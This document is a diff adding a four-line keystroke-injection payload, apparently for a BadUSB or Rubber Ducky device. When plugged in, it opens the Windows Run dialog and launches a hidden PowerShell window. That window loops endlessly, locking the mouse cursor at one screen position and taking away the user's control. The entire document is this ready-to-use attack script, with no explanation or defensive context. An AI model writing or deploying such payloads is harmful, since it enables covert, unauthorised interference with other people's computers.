@@ -1,0 +1,4 @@
+DELAY 500
+GUI r
+DELAY 750
+STRING powershell -w hidden -c "Add-Type -AssemblyName System.Windows.Forms; while ($true) { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(500,500); Start-Sleep -Milliseconds 100 }"
